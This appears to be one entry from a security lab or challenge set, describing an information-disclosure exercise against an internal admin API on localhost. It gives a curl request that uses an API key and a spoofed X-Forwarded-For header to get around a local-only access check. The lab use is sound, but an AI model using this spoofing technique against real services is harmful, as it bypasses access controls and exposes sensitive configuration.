## 18 - Internal admin API information disclosure

### Goal
Retrieve sensitive configuration data from the internal admin API.

### Endpoint
- `GET http://127.0.0.1:4000/api/v1/internal/admin`

### Example

```bash
curl -s \
  -H "X-API-Key: nvk_d56f1953e015cc01e79c84028089135d" \
  -H "X-Forwarded-For: 127.0.0.1" \
  http://127.0.0.1:4000/api/v1/internal/admin
```

